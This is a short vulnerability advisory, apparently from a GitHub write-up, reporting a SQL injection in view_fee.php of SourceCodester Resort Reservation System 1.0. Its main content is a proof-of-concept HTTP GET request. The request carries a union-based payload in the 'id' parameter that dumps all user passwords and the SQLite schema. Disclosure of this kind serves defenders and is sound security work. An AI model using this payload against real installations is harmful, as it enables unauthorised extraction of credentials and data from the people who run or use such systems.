# SourceCodester Resort Reservation System 1.0 has a SQL Injection vulnerability in view_fee.php
## Software

- Software: Resort Reservation System 1.0
- Software Link: https://www.sourcecodester.com/php/16447/resort-reservation-system-php-and-sqlite3-source-code-free-download.html
- Vulnerability Type: SQL Injection
- Attack Type: Remote
- Vendor of Product: Sourcecodester

## Description

SourceCodester Resort Reservation System 1.0 has a SQL Injection vulnerability in view_fee.php. Affected is file view_fee.php, the manipulation of the argument id leads to SQL injection after users logged in. Remote attackers can exploit SQL union-based injection to retrieve all data from the database.

## Vulnerability Code
![](https://github.com/Yesec/Resort-Reservation-System/assets/19534204/20631b9c-420f-4c29-92a8-0b5bf4e0d7ea)

## POC
```http
GET /index.php?page=view_fee&id=100%27%20union%20select%201,(select%20group_concat(password)%20from%20user_list),(select%20group_concat(sql)%20from%20sqlite_master),4,5,6,null--+ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: PHPSESSID=f887a8f5b6e7aeecbfe2daa133dc224c


```

![](https://github.com/Yesec/Resort-Reservation-System/assets/19534204/fdd23051-d3c2-4fed-9611-a4965bc1a1ce)
